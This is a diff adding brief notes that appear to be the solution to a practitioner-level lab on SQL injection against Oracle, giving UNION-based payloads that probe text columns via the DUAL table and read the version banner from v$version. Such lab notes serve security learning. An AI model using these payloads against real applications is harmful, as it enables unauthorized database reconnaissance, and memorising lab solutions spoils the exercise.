@@ -1,0 +1,11 @@
+# SQL injection attack, querying the database type and version on Oracle
+# PRACTITIONER
+
+# FINAL PAYLOAD = ' UNION select 'a', banner FROM v$version--
+
+GOAL => display the database version string
+
+WHEN checking for text type in ORACLE DB you have to use a from table
+you can use the DUAL table
+
+' UNION select 'a', 'a' FROM dual--
